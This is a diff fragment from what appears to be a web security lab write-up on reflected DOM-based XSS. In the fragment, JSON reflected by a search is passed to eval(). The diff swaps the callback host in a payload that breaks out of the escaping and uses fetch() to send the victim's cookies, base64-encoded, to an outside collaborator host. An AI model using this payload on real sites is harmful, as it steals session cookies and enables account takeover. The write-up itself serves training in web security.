@@ -195,7 +195,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 >The search JavaScript code on the target is using the data in JSON reflected response, that is then send to **eval()** function, and not sanitizing **\\** escape proper user input.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
 
 ```JavaScript
-\"-fetch('https://b6iekvt4bvzgy50anfk4rb1oifo6cy0n.oastify.com?cs='+btoa(document.cookie))}//
+\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
 ```  
 
 ![Reflected dom-xss json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
